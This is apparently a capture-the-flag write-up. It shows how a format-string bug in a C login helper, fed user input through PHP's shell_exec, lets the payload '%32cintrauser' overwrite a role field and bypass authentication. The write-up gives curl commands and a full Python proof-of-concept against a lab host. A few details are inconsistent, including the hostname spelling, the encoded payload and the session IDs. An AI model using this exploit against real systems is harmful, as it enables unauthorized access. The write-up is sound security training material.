
# Vulnerability
----

This happens calling the `http://intarnal.ecorp.epi` API endpoint.

#### First step : Find and understand API source code

When we fulfill the [[Ov3rfl0w]] challenge, we can see there is an API call done, and the source code is downloadable at endpoint `/files/intranet.zip`, and the API key is the flag of this last challenge : `EPI{W3lC0m3_70_0v3RFL0wZ}`.

Once downloaded, we can look at the `index.php` file, to understand how it is supposed to work, and we can see that is call `cgi-login.php` by injecting the username as a pipe and then check it the returned role is `intrauser`:

```php
$username = escapeshellarg($_REQUEST["username"]);
$role = shell_exec("echo $username | /var/www/internal/data/cgi-login");
if ($role === "intrauser") {
	session_start();
	$_SESSION['connected'] = true;
	header("Location: /dashboard.php");
	exit();
}
```

So we can now give a better look at the `cgi-login.php` file, and we see that there can be a little overflow attack in order to overwrite the value of `role` by `intrauser`:

```C
int main(int argc, char **argv) {
  struct {
    char username[32];
    char role[64];
  } locals = {
    .username = {0},
    .role = "guest"
  };
  char buffer[32];
  char *valids[] = {"cvxfous", "qu35t", "intern", "junior-dev", "senior-dev"};

  fgets(buffer, sizeof(buffer) - 1, stdin);
  if (strlen(buffer) > 0)
    buffer[strlen(buffer) - 1] = 0;

  sprintf(locals.username, buffer);
[...]
```

We see here that fgets is used, which means it won't be a basic overwrite attack, we will have to use a fomat attack using sprintf.
We want to easily add 32 characters, followed by `intrauser`, which would give us the following payload:
`%32cintrauser` which - once url encoded - become `%2532intrauser`.

The final curl command should be:
```bash
curl http://internal.ecorp.epi -i --data "username=%2532cintrauser&api_key=EPI{W3lC0m3_70_0v3RFL0wZ}"
```

This request returns a HTTP header with the following setting :
`Set-Cookie: PHPSESSID=60057b4573ea71a2237a37bfc337ba0b`

Looking at the source code again, we see the final goal is to reach `dashboard.php`:

```PHP
header("Location: /dashboard.php");
```

So with a basic HTTP request we can access it bu specifying the Cookie to use:

```bash
curl http://internal.ecorp.epi/dashboard.php -i -H "Cookie: PHPSESSID=5cf8d9dffebcbd779f33b07e67e92ebe"
```

Which returns a webpage with the FLAG.

# PoC
---

```python
#!/usr/bin/env python3

import requests
import re

TARGET = "http://internal.ecorp.epi"
API_KEY = "EPI{W3lC0m3_70_0v3RFL0wZ}"

def extract_flag(dashboard_response: str) -> str:
    flag = re.findall(r"EPI\{[^}]+\}", dashboard_response)
    if flag:
            print(flag[0])
    else:
        print("Could not find any flag")


def exploit_overformat():
    print("[*] Step 1 : Format string overflow to obtain session...")
    resp = requests.post(
        TARGET,
        data=f"username=%2532cintrauser&api_key={API_KEY}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )

    session_cookie = resp.cookies.get("PHPSESSID")
    if not session_cookie:
        print("[-] Failure : No PHPSESSID in response")
        return

    print(f"[+] Obtained session : PHPSESSID={session_cookie}")
    assert resp.status_code == 302, f"Did not receive 302"
    assert resp.headers.get("Location") == "/dashboard.php", "Wrong redirection"
    print(f"[+] Redirection to /dashboard.php confirmed")

    print("\n[*] Step 2 : Accessing dashboard...")

    dash = requests.get(
        f"{TARGET}/dashboard.php",
        cookies={"PHPSESSID": session_cookie},
        allow_redirects=False
    )

    if dash.status_code != 200:
        print(f"[-] Dashboard unavailable (status {dash.status_code})")
        return

    print(f"[+] Dashboard available (status {dash.status_code})")
    extract_flag(dash.text)

if __name__ == "__main__":
    exploit_overformat()
```

